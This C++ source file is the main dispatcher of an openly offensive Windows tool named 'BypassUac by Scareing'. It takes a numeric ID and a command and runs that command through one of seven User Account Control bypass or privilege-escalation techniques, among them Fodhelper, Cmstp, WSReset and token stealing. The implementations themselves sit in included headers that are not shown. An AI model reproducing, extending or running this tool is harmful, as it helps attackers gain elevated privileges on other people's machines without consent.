// UAC_wenpon.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include "ComputerDefaults.h"
#include "Fodhelper.h"
#include "Cmstp.h"
#include "IIEAdmin.h"
#include "Security Center.h"
#include "WSReset.h"
#include "TokenSteal.h"




void usage() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE), hHijackEvent = NULL, hDeleteEvent = NULL;
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
    printf("\n BypassUac by Scareing \n");
    printf("\n uac.exe id calc or  uac.exe id cmd \"/c calc\" \n");
    printf("\n ID 1: Fodhelper \n");
    printf("\n ID 2: ComputerDefaults \n");
    printf("\n ID 3: Cmstp \n");
    printf("\n ID 4: IIEObject \n");
    printf("\n ID 5: Security_Center \n");
    printf("\n ID 6: WSReset \n");
    printf("\n ID 7: TokenSteal \n");
    SetConsoleTextAttribute(hConsole, BACKGROUND_BLUE);

}

int main(int argc, char** argv)
{
 


    if (argc < 3)
    {
        //PRINT_USAGE();
        usage();
        return -1;
    }

    int choose = atoi(argv[1]);
    char* arge = argv[2];

    switch (choose) {
    case 1: {
        Fodhelper(arge);
        break;
    }
    case 2: {
        ComputerDefaults(arge);
        break;
    }
    case 3: {
        if (argc < 4)
        {
            //PRINT_USAGE();
            printf("\n uac.exe number cmd \"/c calc\" \n");
            //usage();
            return -1;
        }
        char* arge2 = argv[3];
        Cmstp(arge, arge2);
        break;
    }
    case 4: {
        IIEAdmin(arge);
        break;
    }
    case 5: {
        Security_Center(arge);
        break;
    }
    case 6: {
        WSReset(arge);
        break;
    }
    case 7: {
        
        char* arge2 = argv[3];
        TokenSteal(arge, arge2);
        break;
    }
    }
    
}

